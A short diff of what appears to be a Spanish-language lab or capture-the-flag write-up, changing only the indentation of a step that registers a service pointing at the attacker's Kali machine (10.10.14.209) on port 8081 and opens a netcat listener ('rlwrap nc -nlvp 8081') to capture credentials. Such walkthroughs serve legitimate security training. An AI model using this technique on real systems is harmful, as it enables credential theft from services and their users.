@@ -249,12 +249,12 @@
         }'
   ´´´
 
-  Esto registra un servicio con IP 10.10.14.209 (nuestra máquina Kali) en el puerto 8081.
+ Esto registra un servicio con IP 10.10.14.209 (nuestra máquina Kali) en el puerto 8081.
 
 
-  Ahora configuramos un listener para poder capturar credenciales:
+ Ahora configuramos un listener para poder capturar credenciales:
 
-  Abrimos con ´netcat´
+ Abrimos con ´netcat´
 
   ```bash
     rlwrap nc -nlvp 8081
